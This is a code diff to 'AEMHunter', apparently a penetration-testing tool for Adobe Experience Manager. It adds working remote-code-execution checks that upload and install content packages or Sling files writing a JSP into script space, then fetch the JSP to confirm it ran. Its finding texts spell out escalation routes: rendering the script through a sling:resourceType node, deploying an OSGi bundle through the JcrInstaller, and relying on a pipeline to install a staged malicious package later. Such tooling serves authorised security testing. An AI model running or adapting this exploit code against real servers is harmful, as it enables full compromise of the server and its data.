@@ -1222,8 +1222,13 @@ class AEMHunter:
         return True
 
     def _packmgr_rce_poc(self, acting: str) -> None:
-        canary = "AEMHUNTERRCE" + "".join(random.choices(string.ascii_uppercase, k=6))
-        jsp = '<%= "' + canary + '-" + System.getProperty("user.name") %>'
+        marker = "".join(random.choices(string.ascii_uppercase, k=6))
+        # exec_token only appears if the JSP RUNS: the source splits the literal
+        # ("AEMHUN" + "TERRCE" + ...), so a JSP served as SOURCE never contains the
+        # contiguous token — only runtime string concatenation produces it. This
+        # prevents a source-served JSP from being mis-reported as executed.
+        exec_token = "AEMHUNTERRCE" + marker
+        jsp = '<%= "AEMHUN" + "TERRCE" + "' + marker + '" + "-" + System.getProperty("user.name") %>'
         ref = self.client.base_url + "/crx/packmgr/index.jsp"
         headers = {"Referer": ref}
         if self._csrf_token:
@@ -1252,6 +1257,7 @@ class AEMHunter:
                          "installable+executable JSP...")
         any_upload = False
         any_install = False
+        written_path = None   # a path where the JSP file landed but didn't execute
         last_status = "n/a"
         for root in roots:
             sub = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
@@ -1290,11 +1296,23 @@ class AEMHunter:
                 any_upload = True
                 inst = self.client.post(f"/crx/packmgr/service/.json{pkgpath}",
                                         params={"cmd": "install"}, headers=headers)
+                # legacy install fallback
+                self.client.post("/crx/packmgr/service.jsp",
+                                 data={"cmd": "inst", "name": name + ".zip", "group": grp},
+                                 headers=headers)
                 if self._pkg_success(inst):
                     any_install = True
 
             ex = self.client.get(jsp_repo)
-            executed = ex is not None and canary in (ex.text or "")
+            ex_body = (ex.text if ex is not None else "") or ""
+            executed = ex is not None and exec_token in ex_body          # ran (not just source)
+            # Did the JSP FILE actually land (even if served as source / not executed)?
+            written = (not executed and ex is not None and ex.status_code == 200
+                       and ("System.getProperty" in ex_body or "AEMHUN" in ex_body or "<%" in ex_body))
+            if written:
+                any_install = True
+                if written_path is None:
+                    written_path = jsp_repo
 
             # cleanup this attempt no matter what
             self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "uninstall"}, headers=headers)
@@ -1307,7 +1325,7 @@ class AEMHunter:
                     severity=SEV_CRITICAL, category=CAT_RCE,
                     target=self.target + jsp_repo,
                     evidence=f"user={acting}: uploaded+installed a content package writing {jsp_repo} "
-                             f"and the server executed it: {snippet(ex.text, 160)}",
+                             f"and the server executed it: {snippet(ex_body, 160)}",
                     description=(f"END-TO-END RCE: this role uploaded and installed a content package "
                                  f"that wrote a JSP to {root} (a code/script space) and the server "
                                  "executed attacker Java code. Full server compromise as the AEM "
@@ -1316,39 +1334,63 @@ class AEMHunter:
                     references=["https://github.com/0ang3el/aem-rce-bundle",
                                 "https://github.com/0ang3el/aem-hacker"],
                     request=f"POST /crx/packmgr/service.jsp (vault pkg writing {jsp_repo}, install=true) "
-                            f"then GET {jsp_repo} -> {canary}-<svcuser>",
-                    response_snippet=snippet(ex.text, 300), role=self.role,
+                            f"then GET {jsp_repo} -> {exec_token}-<svcuser>",
+                    response_snippet=snippet(ex_body, 300), role=self.role,
                 ))
                 return
 
-        # Nothing executed — report precisely where it broke.
+        # The JSP FILE landed in a script space but didn't auto-execute -> still
+        # RCE-equivalent (render it via a sling:resourceType node and it runs).
+        if written_path:
+            app_root = "/" + "/".join(written_path.strip("/").split("/")[:2])
+            self.reporter.add(Finding(
+                title=f"Arbitrary code written to {app_root} via package install {self._role_tag()} (RCE-equivalent)",
+                severity=SEV_CRITICAL, category=CAT_RCE, target=self.target + written_path,
+                evidence=f"user={acting}: a package install wrote a JSP at {written_path} "
+                         "(served as source — direct .jsp exec disabled — but the file write into "
+                         "the script space is confirmed).",
+                description=("This role can write executable scripts into the /apps or /libs script "
+                             "space via package install. Direct .jsp execution looks disabled, but "
+                             "rendering the script through a sling:resourceType content node "
+                             "executes it — effectively RCE. Finish the PoC by installing a "
+                             "component (sling:resourceType) plus a /content node that renders it, "
+                             "or by shipping an OSGi bundle into <appRoot>/install (the Sling "
+                             "JcrInstaller deploys it as a system service)."),
+                references=["https://github.com/0ang3el/aem-hacker",
+                            "https://github.com/0ang3el/aem-rce-bundle"],
+                role=self.role,
+            ))
+            return
+
+        # Nothing landed — report precisely where it broke.
         if not any_upload:
             blocked = "UPLOAD denied"
             nxt = ("Package Manager is read-only for THIS role. Try a package-deploy role "
                    "('CPB Content Package Deployer').")
         elif not any_install:
             blocked = "INSTALL denied on every code path tried"
-            nxt = ("This role can create/upload packages but install was rejected for all of "
-                   f"{len(roots)} /apps paths tried. Find the role's actually-allowed target by "
-                   "reading an existing CPB package's filter (/etc/packages -> .../META-INF/"
-                   "vault/filter.xml) and install a JSP/bundle there, or use an OSGi-bundle "
-                   "package into <allowedAppRoot>/install (JcrInstaller runs as a system service).")
+            nxt = (f"This role can create/upload packages to /etc/packages but install (activation) "
+                   f"was rejected on all {len(roots)} code paths tried — including the real package "
+                   "filter roots. This is an UPLOAD-ONLY deployer: it stages packages but a separate "
+                   "gated step (approval/replication/pipeline) installs them. Direct RCE is not "
+                   "reachable via this role's install. Leverage: (a) the staged malicious package "
+                   "may be installed later by that pipeline (second-order RCE); (b) test a role with "
+                   "install rights (e.g. 'Content Reviewer and Publisher'); (c) the OSGi-bundle "
+                   "route still needs install. The full-repo READ + secret exposure + arbitrary "
+                   "package STAGING here are already critical findings on their own.")
         else:
-            blocked = "INSTALL ok but JSP not executed"
-            nxt = ("A package installed but the JSP did not execute (direct .jsp execution may be "
-                   "disabled). Install a sling:resourceType script + a content node that renders "
-                   "it, or an OSGi bundle into <appRoot>/install for code execution.")
+            blocked = "INSTALL ok but JSP neither executed nor found"
+            nxt = ("A package installed (API success) but the JSP was not at the expected path. "
+                   "Install may have rewritten/blocked the path. Manual review with -v recommended.")
 
         self.reporter.add(Finding(
             title=f"Package install RCE NOT achieved {self._role_tag()} — blocked at: {blocked}",
             severity=SEV_HIGH, category=CAT_RCE,
             target=self.target + "/crx/packmgr/service.jsp",
             evidence=f"user={acting} | upload_ok={any_upload} (last status {last_status}) | "
-                     f"install_ok={any_install} | tried {len(roots)} /apps code paths",
-            description=(f"Package-manager RCE attempt result: {blocked}. Next: {nxt} "
-                         "Note: create/upload rights alone are already critical — this role can "
-                         "stage arbitrary packages; combined with the confirmed full-repo READ "
-                         "it is high, provable impact."),
+                     f"install_ok={any_install} | jsp_written={bool(written_path)} | "
+                     f"tried {len(roots)} code paths",
+            description=(f"Package-manager RCE attempt result: {blocked}. Next: {nxt}"),
             references=["https://github.com/0ang3el/aem-rce-bundle"],
             role=self.role,
         ))
@@ -1541,13 +1583,14 @@ class AEMHunter:
 
     def _sling_jsp_rce(self, code_root: str) -> None:
         """Drop a JSP into a known-writable code root and execute it."""
-        canary = "AEMHUNTERRCE" + "".join(random.choices(string.ascii_uppercase, k=6))
-        jsp = '<%= "' + canary + '-" + System.getProperty("user.name") %>'
+        marker = "".join(random.choices(string.ascii_uppercase, k=6))
+        exec_token = "AEMHUNTERRCE" + marker  # only present if the JSP actually runs
+        jsp = '<%= "AEMHUN" + "TERRCE" + "' + marker + '" + "-" + System.getProperty("user.name") %>'
         folder = f"{code_root.rstrip('/')}/aemhunter-{''.join(random.choices(string.ascii_lowercase, k=6))}"
         # Sling file upload creates an nt:file node from a multipart field.
         self._auth_post(folder + "/", files={"poc.jsp": ("poc.jsp", jsp, "application/octet-stream")})
         ex = self.client.get(folder + "/poc.jsp")
-        if ex is not None and canary in (ex.text or ""):
+        if ex is not None and exec_token in (ex.text or ""):
             self.reporter.add(Finding(
                 title=f"REMOTE CODE EXECUTION confirmed via Sling JSP under {code_root} {self._role_tag()}",
                 severity=SEV_CRITICAL, category=CAT_RCE,
